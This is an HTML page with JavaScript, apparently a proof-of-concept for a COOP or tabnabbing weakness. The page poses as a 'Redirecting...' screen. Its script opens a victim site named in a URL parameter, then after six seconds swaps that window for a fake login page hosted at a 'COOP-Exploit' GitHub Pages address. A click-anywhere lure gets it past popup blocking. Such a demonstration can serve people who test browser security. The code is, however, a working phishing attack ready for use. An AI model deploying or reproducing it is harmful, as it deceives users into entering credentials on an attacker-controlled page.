<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            background-color: #f4f7f9;
            width: 100%;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            font-family: 'Arial', sans-serif;
        }
        #message-container {
            background: #ffffff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 80%;
        }
        #message {
            color: #333;
            font-size: 18px;
            line-height: 1.5;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script type="text/javascript">
        let foo; // Declare globally
        
        function tParam(qParam) {
            const frmURL = window.location.search.substring(1);
            const varURL = frmURL.split('&');
            for (let i = 0; i < varURL.length; i++) {
                const vParam = varURL[i].split('=');
                if (vParam[0] === qParam) {
                    return decodeURIComponent(vParam[1]);
                }
            }
            console.warn("Target parameter missing. Redirecting...");
            window.location.href = "https://sp3ttr0.github.io/COOP-Exploit/";
            return null;
        }

        function init() {
            if (foo) {
                console.log("Redirecting to attacker's controlled site");
                foo.location.href = "https://sp3ttr0.github.io/COOP-Exploit/login.html";
            } else {
                console.error("Window object not found, redirection failed.");
            }
        }

        function launch() {
            const target = tParam("target");
            if (!target) return; // Prevent errors if target is null
            foo = window.open(target, "_blank"); // Ensure correct reference
            if (foo) {
                console.log("Target site opened successfully:", target);
                setTimeout(init, 6000);
            } else {
                console.error("Popup blocked or failed to open.");
            }
        }
        
        function setup() {
            const target = tParam("target");
            if (!target) return; // Prevent errors if target is null
            document.body.addEventListener('click', launch);
            const message = document.createElement('div');
            message.id = 'message';
            message.innerText = `If the site did not automatically redirect to ${target}, click anywhere in the white background`;
            document.body.appendChild(message);
            launch();
        }
        
        window.onload = setup;
    </script>
</head>
<body>
    <div id="message-container">
        <div class="loader"></div>
        <div id="message">Redirecting... Please wait.</div>
    </div>
</body>
</html>
